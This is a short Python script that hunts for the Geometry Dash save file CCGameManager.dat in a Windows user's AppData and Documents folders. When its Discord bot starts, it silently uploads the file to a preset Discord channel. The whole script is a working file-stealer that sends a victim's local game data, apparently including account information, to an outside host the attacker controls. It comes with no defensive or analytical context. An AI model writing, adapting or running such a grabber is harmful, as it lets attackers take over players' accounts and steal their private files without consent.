import os
import discord
from discord.ext import commands

def find_ccgame_path():
    filenames = ['CCgamemanager.dat', 'CCGameManager.dat']
    possible_paths = []

    for filename in filenames:
        possible_paths.extend([
            os.path.expanduser(f'~\\AppData\\Local\\GeometryDash\\{filename}'),
            os.path.expanduser(f'~\\AppData\\Roaming\\GeometryDash\\{filename}'),
            os.path.expanduser(f'~\\Documents\\GeometryDash\\{filename}')
        ])

    for path in possible_paths:
        if os.path.isfile(path):
            return path
    return None

TOKEN = 'BOT_TOKEN' 
CHANNEL_ID = 123456789012345678 # Channel ID

intents = discord.Intents.default()
intents.messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        file_path = find_ccgame_path()
        if file_path:
            with open(file_path, 'rb') as file:
                await channel.send("Here's the CCgamemanager.dat file:", file=discord.File(file, 'CCgamemanager.dat'))
        else:
            await channel.send("CCgamemanager.dat or CCGameManager.dat file not found.")
    else:
        print("Channel not found.")

bot.run(TOKEN)
